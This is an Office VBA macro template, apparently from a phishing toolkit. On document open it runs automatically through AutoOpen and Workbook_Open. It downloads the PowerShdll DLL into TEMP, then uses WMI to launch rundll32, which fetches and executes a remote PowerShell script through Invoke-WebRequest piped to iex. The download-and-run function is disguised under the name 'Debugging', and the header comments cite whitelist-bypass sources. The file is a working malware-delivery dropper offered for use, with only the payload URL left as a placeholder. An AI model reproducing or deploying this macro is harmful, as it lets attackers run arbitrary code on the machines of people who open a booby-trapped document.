' Download and execute powershell script using rundll32.exe, without powershell.exe
' Thx to https://medium.com/@vivami/phishing-between-the-app-whitelists-1b7dcdab4279
' And https://github.com/p3nt4/PowerShdll

Sub AutoOpen()
    Debugging
End Sub

Sub Workbook_Open()
    Debugging
End Sub

Public Function Debugging() As Variant
    DownloadDLL
    Dim Str As String
    Str = "C:\Windows\System32\rundll32.exe " & Environ("TEMP") & "\powershdll.dll,main . { Invoke-WebRequest -useb <<<TEMPLATE>>> } ^| iex;"
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
    Set objConfig = objStartup.SpawnInstance_
    Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
    errReturn = objProcess.Create(Str, Null, objConfig, intProcessID)
End Function


Sub DownloadDLL()
    Dim dll_Loc As String
    dll_Loc = Environ("TEMP") & "\powershdll.dll"
    If Not Dir(dll_Loc, vbDirectory) = vbNullString Then
        Exit Sub
    End If
    
    Dim dll_URL As String
    #If Win64 Then
        dll_URL = "https://github.com/p3nt4/PowerShdll/raw/master/dll/bin/x64/Release/PowerShdll.dll"
    #Else
        dll_URL = "https://github.com/p3nt4/PowerShdll/raw/master/dll/bin/x86/Release/PowerShdll.dll"
    #End If
    
    Dim WinHttpReq As Object
    Set WinHttpReq = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    WinHttpReq.Open "GET", dll_URL, False
    WinHttpReq.send

    myURL = WinHttpReq.responseBody
    If WinHttpReq.Status = 200 Then
        Set oStream = CreateObject("ADODB.Stream")
        oStream.Open
        oStream.Type = 1
        oStream.Write WinHttpReq.responseBody
        oStream.SaveToFile dll_Loc
        oStream.Close
    End If
End Sub
